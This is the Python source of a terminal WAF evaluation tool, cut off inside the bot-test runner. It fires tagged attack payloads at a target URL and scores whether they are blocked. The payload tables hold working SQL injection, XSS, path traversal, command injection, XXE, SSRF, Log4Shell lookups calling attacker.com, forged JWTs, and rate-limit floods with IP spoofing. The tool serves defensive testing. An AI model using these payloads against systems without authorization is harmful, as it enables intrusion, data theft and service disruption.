#!/usr/bin/env python3
"""
WAF Tester v1.2.0 — Python Edition
Terminal UI WAF evaluation tool — 90 tests across 6 suites.
Compliance tags: OWASP, CWE, NIST, PCI-DSS.

Usage:
    python waf_tester.py --url https://target.example.com [options]

Options:
    --url           Target URL (required)
    --suites        Comma-separated suites: owasp,ratelimit,bot,bypass,api,bizlogic (default: all)
    --auth-type     none | bearer | apikey | cookie | basic (default: none)
    --auth-value    Token, cookie string, or API key value
    --auth-header   Header name for apikey auth (default: X-API-Key)
    --auth-user     Username for basic auth
    --auth-pass     Password for basic auth
    --no-baseline   Disable baseline comparison
    --no-rotate-ua  Disable User-Agent rotation
    --waf-header    Send X-WAF-Tester identification header
    --output        Output modes: terminal,json,html (default: terminal,json,html)
    --output-dir    Directory for report files (default: current directory)
    --timeout       Request timeout in seconds (default: 10)
    --confirm       Skip the authorization confirmation prompt

⚠️  Only test systems you own or have explicit written permission to test.
"""

import argparse
import base64
import json
import os
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from itertools import cycle
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TaskProgressColumn, TextColumn
from rich.table import Table
from rich.text import Text
from rich import box

console = Console()

# ── Constants ──────────────────────────────────────────────────────────────────

VERSION = "1.2.0"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]
ua_cycle = cycle(USER_AGENTS)

TAG_COLORS = {"OWASP": "dark_orange", "CWE": "steel_blue1", "NIST": "green3", "PCI": "medium_purple1"}
BLOCKING_STATUSES = {400, 403, 405, 406, 429, 503}
HARD_BLOCK_STATUSES = {403, 406, 429}
WAF_KEYWORDS = [
    "blocked", "forbidden", "access denied", "waf", "firewall",
    "security violation", "rejected", "not acceptable", "request denied", "threat detected",
]

SUITE_LABELS = {
    "owasp":    "OWASP / CWE Core",
    "ratelimit":"Rate Limiting",
    "bot":      "Bot Detection",
    "bypass":   "Bypass Attempts",
    "api":      "API Security",
    "bizlogic": "Business Logic",
}

SUITE_TOTALS = {
    "owasp": 44, "ratelimit": 3, "bot": 10,
    "bypass": 15, "api": 10, "bizlogic": 8,
}


# ── HTTP helpers ───────────────────────────────────────────────────────────────

def build_headers(run_opts: dict, override_ua: Optional[str] = None) -> dict:
    ua = override_ua if override_ua is not None else (
        next(ua_cycle) if run_opts.get("rotate_ua") else USER_AGENTS[0]
    )
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    if run_opts.get("waf_header"):
        headers["X-WAF-Tester"] = "waf-tester"

    auth = run_opts.get("auth")
    if auth:
        t = auth.get("type")
        if t == "bearer" and auth.get("value"):
            headers["Authorization"] = f"Bearer {auth['value']}"
        elif t == "apikey" and auth.get("value"):
            headers[auth.get("header_name", "X-API-Key")] = auth["value"]
        elif t == "cookie" and auth.get("value"):
            headers["Cookie"] = auth["value"]
        elif t == "basic" and auth.get("user"):
            creds = base64.b64encode(f"{auth['user']}:{auth.get('pass','')}".encode()).decode()
            headers["Authorization"] = f"Basic {creds}"
    return headers


def make_request(url: str, method: str = "GET", headers: Optional[dict] = None,
                 body: Optional[str] = None, timeout: int = 10,
                 override_path: Optional[str] = None,
                 proxies: Optional[dict] = None) -> dict:
    start = time.time()
    try:
        parsed = urllib.parse.urlparse(url)
        if override_path:
            url = urllib.parse.urlunparse(parsed._replace(path=override_path, query=""))

        resp = requests.request(
            method, url, headers=headers or {}, data=body,
            timeout=timeout, verify=False, allow_redirects=False,
            proxies=proxies,
        )
        latency = int((time.time() - start) * 1000)
        return {
            "status": resp.status_code,
            "body": resp.text[:500],
            "headers": dict(resp.headers),
            "latency": latency,
            "error": None,
        }
    except requests.exceptions.Timeout:
        return {"status": None, "body": "", "headers": {}, "latency": 10000, "error": "Timeout"}
    except Exception as e:
        latency = int((time.time() - start) * 1000)
        return {"status": None, "body": "", "headers": {}, "latency": latency, "error": str(e)}


def evaluate(res: dict, baseline: Optional[dict] = None) -> dict:
    if res["error"]:
        return {"blocked": None, "confidence": "uncertain", "reason": f"Network error: {res['error']}"}

    body_lower = (res["body"] or "").lower()
    has_waf_kw = any(kw in body_lower for kw in WAF_KEYWORDS)

    if res["status"] in HARD_BLOCK_STATUSES:
        return {"blocked": True, "confidence": "high", "reason": f"HTTP {res['status']} — definitive block"}

    if baseline and res["status"] == baseline["status"]:
        base_len = len(baseline.get("body", "") or "")
        res_len = len(res["body"] or "")
        len_diff = abs(res_len - base_len) / base_len if base_len > 0 else 0
        if has_waf_kw:
            return {"blocked": True, "confidence": "likely", "reason": f"HTTP {res['status']} matches baseline but body contains WAF keywords"}
        if len_diff > 0.6 and res_len < base_len:
            return {"blocked": True, "confidence": "uncertain", "reason": f"HTTP {res['status']} — response {int(len_diff*100)}% shorter than baseline"}
        return {"blocked": False, "confidence": "bypassed", "reason": f"HTTP {res['status']} — response matches baseline, payload reached origin"}

    if res["status"] in {400, 405, 503}:
        if has_waf_kw:
            return {"blocked": True, "confidence": "likely", "reason": f"HTTP {res['status']} with WAF keywords in body"}
        if baseline and res["status"] != baseline["status"]:
            return {"blocked": True, "confidence": "uncertain", "reason": f"HTTP {res['status']} — differs from baseline {baseline['status']}"}
        return {"blocked": True, "confidence": "uncertain", "reason": f"HTTP {res['status']} — may be WAF block or app error"}

    if has_waf_kw:
        return {"blocked": True, "confidence": "likely", "reason": f"HTTP {res['status']} but body contains WAF keywords"}

    return {"blocked": False, "confidence": "bypassed", "reason": f"HTTP {res['status']} — payload reached origin"}


# ── Test definitions ───────────────────────────────────────────────────────────

def get_owasp_tests():
    return [
        # SQL Injection
        {"id":"sqli-1",  "name":"SQLi — Classic OR",               "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10","PCI:6.4"],  "payload":"' OR '1'='1",                              "mode":"query"},
        {"id":"sqli-2",  "name":"SQLi — UNION SELECT",             "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10","PCI:6.4"],  "payload":"' UNION SELECT 1,2,3--",                    "mode":"query"},
        {"id":"sqli-3",  "name":"SQLi — Blind time delay",         "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10","PCI:6.4"],  "payload":"'; WAITFOR DELAY '0:0:5'--",                 "mode":"query"},
        {"id":"sqli-4",  "name":"SQLi — Error-based (extractvalue)","category":"SQL Injection",       "tags":["OWASP:A03","CWE-89","NIST:SI-10"],             "payload":"' AND extractvalue(1,concat(0x7e,version()))--","mode":"query"},
        {"id":"sqli-5",  "name":"SQLi — Stacked queries",          "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10","PCI:6.4"],  "payload":"'; DROP TABLE users--",                      "mode":"query"},
        {"id":"sqli-6",  "name":"SQLi — Hex encoding",             "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10"],             "payload":"' OR 0x313d31--",                            "mode":"query"},
        {"id":"sqli-7",  "name":"SQLi — Comment bypass",           "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10"],             "payload":"'/**/OR/**/1=1--",                           "mode":"query"},
        {"id":"sqli-8",  "name":"SQLi — Out-of-band DNS",          "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89"],                          "payload":"'; EXEC master..xp_dirtree '//attacker.com/a'--","mode":"query"},
        {"id":"sqli-9",  "name":"SQLi — MySQL SLEEP",              "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10"],             "payload":"' OR SLEEP(5)--",                            "mode":"query"},
        {"id":"sqli-10", "name":"SQLi — Whitespace tab bypass",    "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89"],                          "payload":"'\tOR\t'1'='1",                              "mode":"query"},
        {"id":"sqli-11", "name":"SQLi — Boolean blind",            "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89","NIST:SI-10","PCI:6.4"],  "payload":"' AND 1=1--",                               "mode":"query"},
        {"id":"sqli-12", "name":"SQLi — Second-order (stored)",    "category":"SQL Injection",        "tags":["OWASP:A03","CWE-89"],                          "payload":"admin'--",                                   "mode":"query"},
        # XSS
        {"id":"xss-1",   "name":"XSS — Script tag",                "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79","NIST:SI-10","PCI:6.4"],  "payload":"<script>alert(1)</script>",                  "mode":"query"},
        {"id":"xss-2",   "name":"XSS — img onerror",               "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79","NIST:SI-10","PCI:6.4"],  "payload":"<img src=x onerror=alert(1)>",               "mode":"query"},
        {"id":"xss-3",   "name":"XSS — SVG onload",                "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79","NIST:SI-10"],             "payload":"<svg onload=alert(1)>",                      "mode":"query"},
        {"id":"xss-4",   "name":"XSS — DOM javascript: URI",       "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79"],                          "payload":"javascript:alert(document.domain)",           "mode":"query"},
        {"id":"xss-5",   "name":"XSS — Polyglot",                  "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79","NIST:SI-10"],             "payload":"jaVasCript:/*`/*'/*\"/**/(oNcliCk=alert())//%0D%0A//</stYle/</scRipt/--!><sVg/oNloAd=alert()>","mode":"query"},
        {"id":"xss-6",   "name":"XSS — onfocus autofocus",         "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79"],                          "payload":"<input onfocus=alert(1) autofocus>",          "mode":"query"},
        {"id":"xss-7",   "name":"XSS — CSS @import",               "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79"],                          "payload":"<style>@import \"javascript:alert(1)\"</style>","mode":"query"},
        {"id":"xss-8",   "name":"XSS — HTML entity bypass",        "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79"],                          "payload":"&lt;script&gt;alert(1)&lt;/script&gt;",      "mode":"query"},
        {"id":"xss-9",   "name":"XSS — Template literal",          "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79"],                          "payload":"${alert(1)}",                                "mode":"query"},
        {"id":"xss-10",  "name":"XSS — Markdown link injection",   "category":"Cross-Site Scripting", "tags":["OWASP:A03","CWE-79"],                          "payload":"[click](javascript:alert(1))",                "mode":"query"},
        # Path Traversal
        {"id":"lfi-1",   "name":"Path Traversal — dot-dot-slash",  "category":"Path Traversal",       "tags":["OWASP:A01","CWE-22","NIST:AC-3","PCI:6.4"],   "payload":"../../../etc/passwd",                        "mode":"path"},
        {"id":"lfi-2",   "name":"Path Traversal — URL encoded",    "category":"Path Traversal",       "tags":["OWASP:A01","CWE-22","NIST:AC-3","PCI:6.4"],   "payload":"..%2F..%2F..%2Fetc%2Fpasswd",                "mode":"path"},
        {"id":"lfi-3",   "name":"Path Traversal — double encoded", "category":"Path Traversal",       "tags":["OWASP:A01","CWE-22","NIST:AC-3"],              "payload":"..%252F..%252F..%252Fetc%252Fpasswd",         "mode":"path"},
        {"id":"lfi-4",   "name":"Path Traversal — Windows path",   "category":"Path Traversal",       "tags":["OWASP:A01","CWE-22","NIST:AC-3"],              "payload":"..\\..\\..\\windows\\win.ini",                "mode":"path"},
        # Command Injection
        {"id":"cmdi-1",  "name":"Command Injection — semicolon",   "category":"Command Injection",    "tags":["OWASP:A03","CWE-78","NIST:SI-10","PCI:6.4"],  "payload":"; cat /etc/passwd",                          "mode":"query"},
        {"id":"cmdi-2",  "name":"Command Injection — pipe",        "category":"Command Injection",    "tags":["OWASP:A03","CWE-78","NIST:SI-10","PCI:6.4"],  "payload":"| whoami",                                   "mode":"query"},
        {"id":"cmdi-3",  "name":"Command Injection — backtick",    "category":"Command Injection",    "tags":["OWASP:A03","CWE-78","NIST:SI-10"],             "payload":"`id`",                                       "mode":"query"},
        {"id":"cmdi-4",  "name":"Command Injection — $() subshell","category":"Command Injection",    "tags":["OWASP:A03","CWE-78","NIST:SI-10"],             "payload":"$(id)",                                      "mode":"query"},
        # XXE
        {"id":"xxe-1",   "name":"XXE — File disclosure",           "category":"XXE Injection",        "tags":["OWASP:A05","CWE-611","NIST:SI-10","PCI:6.4"], "payload":'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "mode":"body","content_type":"application/xml"},
        {"id":"xxe-2",   "name":"XXE — SSRF via DTD",              "category":"XXE Injection",        "tags":["OWASP:A05","CWE-611","NIST:SI-10"],            "payload":'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', "mode":"body","content_type":"application/xml"},
        # SSRF
        {"id":"ssrf-1",  "name":"SSRF — localhost admin",          "category":"SSRF",                 "tags":["OWASP:A10","CWE-918","NIST:AC-3","PCI:6.4"],  "payload":"http://localhost/admin",                     "mode":"query"},
        {"id":"ssrf-2",  "name":"SSRF — AWS metadata",             "category":"SSRF",                 "tags":["OWASP:A10","CWE-918","NIST:AC-3","PCI:6.4"],  "payload":"http://169.254.169.254/latest/meta-data/",    "mode":"query"},
        {"id":"ssrf-3",  "name":"SSRF — GCP metadata",             "category":"SSRF",                 "tags":["OWASP:A10","CWE-918","NIST:AC-3"],             "payload":"http://metadata.google.internal/computeMetadata/v1/","mode":"query"},
        {"id":"ssrf-4",  "name":"SSRF — file:// protocol",         "category":"SSRF",                 "tags":["OWASP:A10","CWE-918"],                         "payload":"file:///etc/passwd",                         "mode":"query"},
        # Log4Shell
        {"id":"log4j-1", "name":"Log4Shell — JNDI LDAP",           "category":"Known CVE",            "tags":["OWASP:A06","CWE-917","NIST:SI-2","PCI:6.4"],  "payload":"${jndi:ldap://attacker.com/a}",              "mode":"header","header_name":"X-Api-Version"},
        {"id":"log4j-2", "name":"Log4Shell — JNDI RMI",            "category":"Known CVE",            "tags":["OWASP:A06","CWE-917","NIST:SI-2"],             "payload":"${jndi:rmi://attacker.com/a}",               "mode":"header","header_name":"User-Agent"},
        {"id":"log4j-3", "name":"Log4Shell — Nested bypass",       "category":"Known CVE",            "tags":["OWASP:A06","CWE-917","NIST:SI-2"],             "payload":"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}","mode":"header","header_name":"X-Forwarded-For"},
        # SSTI
        {"id":"ssti-1",  "name":"SSTI — Jinja2 math probe",        "category":"SSTI",                 "tags":["OWASP:A03","CWE-94","NIST:SI-10"],             "payload":"{{7*7}}",                                    "mode":"query"},
        {"id":"ssti-2",  "name":"SSTI — Twig/Smarty probe",        "category":"SSTI",                 "tags":["OWASP:A03","CWE-94","NIST:SI-10"],             "payload":"{{7*'7'}}",                                  "mode":"query"},
        # Open Redirect
        {"id":"redir-1", "name":"Open Redirect — absolute URL",    "category":"Open Redirect",        "tags":["OWASP:A01","CWE-601","NIST:AC-3"],             "payload":"https://evil.attacker.com",                  "mode":"query"},
        {"id":"redir-2", "name":"Open Redirect — protocol-relative","category":"Open Redirect",       "tags":["OWASP:A01","CWE-601","NIST:AC-3"],             "payload":"//attacker.com/phish",                       "mode":"query"},
    ]


def get_bot_tests():
    return [
        {"id":"bot-1",  "name":"Missing User-Agent",    "tags":["OWASP:A04","CWE-284","NIST:SI-3"],            "ua":"",                                                                     "desc":"Empty User-Agent header"},
        {"id":"bot-2",  "name":"Scanner — sqlmap",      "tags":["OWASP:A04","CWE-284","NIST:SI-3","PCI:6.4"], "ua":"sqlmap/1.7.8#stable (https://sqlmap.org)",             "desc":"sqlmap user-agent"},
        {"id":"bot-3",  "name":"Scanner — Nikto",       "tags":["OWASP:A04","CWE-284","NIST:SI-3","PCI:6.4"], "ua":"Mozilla/5.00 (Nikto/2.1.6)",                           "desc":"Nikto scanner UA"},
        {"id":"bot-4",  "name":"Scanner — Nmap NSE",    "tags":["OWASP:A04","CWE-284","NIST:SI-3"],            "ua":"Mozilla/5.0 Nmap Scripting Engine",                    "desc":"Nmap NSE UA"},
        {"id":"bot-5",  "name":"Headless Chrome",       "tags":["OWASP:A04","CWE-284","NIST:SI-3"],            "ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome/120.0.0.0","desc":"Headless Chrome UA"},
        {"id":"bot-6",  "name":"Python Requests",       "tags":["OWASP:A04","CWE-284","NIST:SI-3"],            "ua":"python-requests/2.31.0",                               "desc":"Python requests library"},
        {"id":"bot-7",  "name":"curl UA",               "tags":["OWASP:A04","CWE-284","NIST:SI-3"],            "ua":"curl/8.4.0",                                           "desc":"curl user-agent"},
        {"id":"bot-8",  "name":"Scrapy Spider",         "tags":["OWASP:A04","CWE-284","NIST:SI-3"],            "ua":"Scrapy/2.11.0 (+https://scrapy.org)",                  "desc":"Scrapy web scraper"},
        {"id":"bot-9",  "name":"Masscan",               "tags":["OWASP:A04","CWE-284","NIST:SI-3"],            "ua":"masscan/1.3 (https://github.com/robertdavidgraham/masscan)","desc":"Port scanner UA"},
        {"id":"bot-10", "name":"No Accept header",      "tags":["OWASP:A04","CWE-284"],                        "ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120", "desc":"Missing Accept/Accept-Language headers","strip_headers":True},
    ]


def get_bypass_tests():
    return [
        {"id":"bp-1",  "name":"SQLi — Null byte bypass",           "tags":["OWASP:A03","CWE-89","NIST:SI-10"],  "payload":"' OR 1=1\x00--",                              "desc":"SQLi with null byte",              "mode":"query"},
        {"id":"bp-2",  "name":"SQLi — Case variation",             "tags":["OWASP:A03","CWE-89","NIST:SI-10"],  "payload":"' oR '1'='1",                                 "desc":"Mixed-case OR keyword",            "mode":"query"},
        {"id":"bp-3",  "name":"SQLi — Inline comment",             "tags":["OWASP:A03","CWE-89","NIST:SI-10"],  "payload":"' OR/**/1=1--",                               "desc":"SQL comment within payload",       "mode":"query"},
        {"id":"bp-4",  "name":"SQLi — Base64 encoded",             "tags":["OWASP:A03","CWE-89"],               "payload":base64.b64encode(b"' OR 1=1--").decode(),      "desc":"Base64-encoded SQLi",              "mode":"query"},
        {"id":"bp-5",  "name":"SQLi — URL encoded",                "tags":["OWASP:A03","CWE-89","NIST:SI-10"],  "payload":"%27%20OR%20%271%27%3D%271",                   "desc":"URL-encoded SQLi",                 "mode":"query"},
        {"id":"bp-6",  "name":"XSS — Double URL-encode",           "tags":["OWASP:A03","CWE-79","NIST:SI-10"],  "payload":"%253Cscript%253Ealert(1)%253C%2Fscript%253E", "desc":"Double-encoded <script>",          "mode":"query"},
        {"id":"bp-7",  "name":"XSS — Unicode fullwidth",           "tags":["OWASP:A03","CWE-79","NIST:SI-10"],  "payload":"\uff1cscript\uff1ealert(1)\uff1c/script\uff1e","desc":"Fullwidth Unicode <script>",       "mode":"query"},
        {"id":"bp-8",  "name":"XSS — HTML entity evasion",         "tags":["OWASP:A03","CWE-79"],               "payload":"&lt;script&gt;alert(1)&lt;/script&gt;",       "desc":"HTML entities in payload",         "mode":"query"},
        {"id":"bp-9",  "name":"Header injection (CRLF)",           "tags":["OWASP:A03","CWE-113","NIST:SI-10"], "extra_headers":{"X-Custom":"test\r\nX-Injected: evil"}, "desc":"CRLF in custom header",            "mode":"header_inject"},
        {"id":"bp-10", "name":"Host header injection",             "tags":["OWASP:A01","CWE-284","NIST:AC-3"],  "extra_headers":{"Host":"evil.attacker.com"},             "desc":"Spoofed Host header",              "mode":"header_inject"},
        {"id":"bp-11", "name":"HTTP method override",              "tags":["OWASP:A01","CWE-284"],              "extra_headers":{"X-HTTP-Method-Override":"DELETE"},       "desc":"Method override header",           "mode":"header_inject"},
        {"id":"bp-12", "name":"Double slash path bypass",          "tags":["OWASP:A01","CWE-22","NIST:AC-3"],  "desc":"Double-slash path prefix",                         "mode":"path_override","path_suffix":"double_slash"},
        {"id":"bp-13", "name":"Semicolon path bypass",             "tags":["OWASP:A01","CWE-22","NIST:AC-3"],  "desc":"Semicolon path trick",                             "mode":"path_override","path_suffix":"semicolon"},
        {"id":"bp-14", "name":"Protocol-relative SSRF",            "tags":["OWASP:A10","CWE-918"],             "payload":"//attacker.com/steal",                          "desc":"Protocol-relative URL",            "mode":"query"},
        {"id":"bp-15", "name":"Unicode path normalization",        "tags":["OWASP:A01","CWE-22"],              "payload":"/\u2025/\u2025/etc/passwd",                     "desc":"Unicode path separator bypass",    "mode":"query"},
    ]


def get_api_tests():
    return [
        {"id":"api-1",  "name":"GraphQL Introspection",           "tags":["OWASP:A05","CWE-284","NIST:AC-3"],          "body":'{"query":"{__schema{types{name}}}"}',                       "content_type":"application/json","method":"POST"},
        {"id":"api-2",  "name":"GraphQL Batch Query Flood",       "tags":["OWASP:A04","CWE-400","NIST:SC-5"],          "body":json.dumps([{"query":"{__typename}"}]*10),                   "content_type":"application/json","method":"POST"},
        {"id":"api-3",  "name":"GraphQL Field Enumeration",       "tags":["OWASP:A05","CWE-284"],                      "body":'{"query":"{__type(name:\\"User\\"){fields{name}}}"}',        "content_type":"application/json","method":"POST"},
        {"id":"api-4",  "name":"JWT None Algorithm",              "tags":["OWASP:A02","CWE-347","NIST:IA-5","PCI:6.4"],"extra_headers":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."},"method":"GET"},
        {"id":"api-5",  "name":"JWT Algorithm Confusion (RS→HS)", "tags":["OWASP:A02","CWE-347","NIST:IA-5"],          "extra_headers":{"Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.TAMPERED"},"method":"GET"},
        {"id":"api-6",  "name":"Mass Assignment (role escalation)","tags":["OWASP:A03","CWE-915","NIST:AC-3","PCI:6.4"],"body":'{"username":"test","password":"test","role":"admin","isAdmin":true}', "content_type":"application/json","method":"POST"},
        {"id":"api-7",  "name":"HTTP Verb Tampering (DELETE)",    "tags":["OWASP:A01","CWE-284","NIST:AC-3"],          "method":"DELETE"},
        {"id":"api-8",  "name":"HTTP Verb Tampering (PUT)",       "tags":["OWASP:A01","CWE-284","NIST:AC-3"],          "method":"PUT"},
        {"id":"api-9",  "name":"BOLA — Object Level Auth Bypass", "tags":["OWASP:A01","CWE-639","NIST:AC-3","PCI:6.4"],"method":"GET","path_override":"bola"},
        {"id":"api-10", "name":"Content-Type Confusion Attack",   "tags":["OWASP:A03","CWE-436","NIST:SI-10"],         "body":"' OR 1=1--","content_type":"text/plain","method":"POST"},
    ]


def get_bizlogic_tests():
    return [
        {"id":"bl-1","name":"Negative Quantity (price manipulation)", "tags":["OWASP:A01","CWE-840","NIST:AC-3","PCI:6.4"],"body":'{"item_id":1,"quantity":-1,"price":9.99}',                        "method":"POST","content_type":"application/json"},
        {"id":"bl-2","name":"Zero-price product submission",          "tags":["OWASP:A01","CWE-840","NIST:AC-3","PCI:6.4"],"body":'{"item_id":1,"quantity":1,"price":0.00}',                         "method":"POST","content_type":"application/json"},
        {"id":"bl-3","name":"Admin endpoint direct access",           "tags":["OWASP:A01","CWE-284","NIST:AC-3","PCI:6.4"],"method":"GET","path_override":"admin"},
        {"id":"bl-4","name":"HTTP Parameter Pollution (role dup)",    "tags":["OWASP:A01","CWE-235","NIST:SI-10"],          "method":"GET","path_override":"hpp"},
        {"id":"bl-5","name":"Account Enumeration (timing probe)",     "tags":["OWASP:A07","CWE-204","NIST:IA-5","PCI:6.4"], "body":'{"username":"admin@example.com","password":"wrongpassword123"}', "method":"POST","content_type":"application/json"},
        {"id":"bl-6","name":"Excessive Data Exposure",                "tags":["OWASP:A02","CWE-209","NIST:SI-11"],           "method":"GET","path_override":"user_verbose"},
        {"id":"bl-7","name":"Forced Browsing — hidden endpoint",      "tags":["OWASP:A01","CWE-284","NIST:AC-3","PCI:6.4"], "method":"GET","path_override":"internal"},
        {"id":"bl-8","name":"Privilege Escalation via role param",    "tags":["OWASP:A01","CWE-269","NIST:AC-6","PCI:6.4"], "body":'{"user_id":42,"role":"superadmin","action":"elevate"}',          "method":"POST","content_type":"application/json"},
    ]


# ── Test runners ───────────────────────────────────────────────────────────────

def run_owasp(url: str, run_opts: dict, baseline: Optional[dict], progress, task) -> list:
    results = []
    parsed = urllib.parse.urlparse(url)
    for t in get_owasp_tests():
        headers = build_headers(run_opts)
        mode = t.get("mode", "query")

        if mode == "query":
            parts = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parts.query)
            qs["q"] = [t["payload"]]
            new_url = urllib.parse.urlunparse(parts._replace(query=urllib.parse.urlencode(qs, doseq=True)))
            res = make_request(new_url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))
        elif mode == "path":
            res = make_request(url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"),
                               override_path="/" + t["payload"])
        elif mode == "header":
            headers[t["header_name"]] = t["payload"]
            res = make_request(url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))
        elif mode == "body":
            headers["Content-Type"] = t.get("content_type", "application/xml")
            res = make_request(url, method="POST", headers=headers,
                               body=t["payload"], timeout=run_opts["timeout"],
                               proxies=run_opts.get("proxy"))
        else:
            res = make_request(url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))

        ev = evaluate(res, baseline)
        results.append({**t, "status": res["status"], "latency": res["latency"],
                        "blocked": ev["blocked"], "confidence": ev["confidence"], "reason": ev["reason"],
                        "payload_display": t["payload"][:60]})
        progress.advance(task)
        time.sleep(0.15)
    return results


def run_ratelimit(url: str, run_opts: dict, progress, task) -> list:
    results = []
    blocking = {400, 403, 429, 503}

    # Burst
    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = [ex.submit(make_request, url, "GET", build_headers(run_opts), None, run_opts["timeout"]) for _ in range(30)]
        burst = [f.result() for f in as_completed(futs)]
    bb = sum(1 for r in burst if r["status"] in blocking)
    b429 = sum(1 for r in burst if r["status"] == 429)
    b403 = sum(1 for r in burst if r["status"] == 403)
    results.append({
        "id":"rl-burst","name":"Burst Flood (30 simultaneous)","category":"Rate Limiting",
        "tags":["OWASP:A04","CWE-400","NIST:SC-5","PCI:6.4"],
        "payload_display":"30 concurrent GET requests",
        "status": next((r["status"] for r in burst if r["status"] in blocking), burst[0]["status"]),
        "latency": max(r["latency"] for r in burst),
        "blocked": bb >= 6,
        "confidence": "high" if bb >= 15 else "likely" if bb >= 6 else "uncertain" if bb > 0 else "bypassed",
        "reason": f"{bb}/30 blocked (429:{b429}, 403:{b403}) — threshold ≥6",
    })
    progress.advance(task)

    # Sequential
    seq = []
    for _ in range(20):
        seq.append(make_request(url, headers=build_headers(run_opts), timeout=run_opts["timeout"], proxies=run_opts.get("proxy")))
        time.sleep(0.1)
    sb = sum(1 for r in seq if r["status"] in blocking)
    s429 = sum(1 for r in seq if r["status"] == 429)
    results.append({
        "id":"rl-seq","name":"Sequential Flood (20 req @ 100ms)","category":"Rate Limiting",
        "tags":["OWASP:A04","CWE-400","NIST:SC-5","PCI:6.4"],
        "payload_display":"20 sequential GET requests 100ms apart",
        "status": next((r["status"] for r in seq if r["status"] in blocking), seq[-1]["status"]),
        "latency": sum(r["latency"] for r in seq),
        "blocked": sb >= 1,
        "confidence": "high" if sb >= 5 else "likely" if sb >= 1 else "bypassed",
        "reason": f"{sb}/20 blocked (429:{s429}) — threshold ≥1",
    })
    progress.advance(task)

    # XFF spoof
    def spoof_req(i):
        h = build_headers(run_opts)
        h["X-Forwarded-For"] = f"10.0.0.{i+1}"
        h["X-Real-IP"] = f"10.0.0.{i+1}"
        return make_request(url, headers=h, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))
    with ThreadPoolExecutor(max_workers=15) as ex:
        spoof = [f.result() for f in as_completed([ex.submit(spoof_req, i) for i in range(15)])]
    spb = sum(1 for r in spoof if r["status"] in blocking)
    results.append({
        "id":"rl-spoof","name":"Rate Limit Bypass (X-Forwarded-For rotation)","category":"Rate Limiting",
        "tags":["OWASP:A04","CWE-400","NIST:SC-5"],
        "payload_display":"X-Forwarded-For: 10.0.0.1–15",
        "status": next((r["status"] for r in spoof if r["status"] in blocking), spoof[0]["status"]),
        "latency": max(r["latency"] for r in spoof),
        "blocked": spb >= 3,
        "confidence": "high" if spb >= 8 else "likely" if spb >= 3 else "uncertain" if spb > 0 else "bypassed",
        "reason": f"{spb}/15 blocked despite spoofed IPs — bypass {'prevented' if spb >= 3 else 'SUCCEEDED (WAF trusts XFF)'}",
    })
    progress.advance(task)
    return results


def run_bot(url: str, run_opts: dict, baseline: Optional[dict], progress, task) -> list:
    results = []
    for t in get_bot_tests():
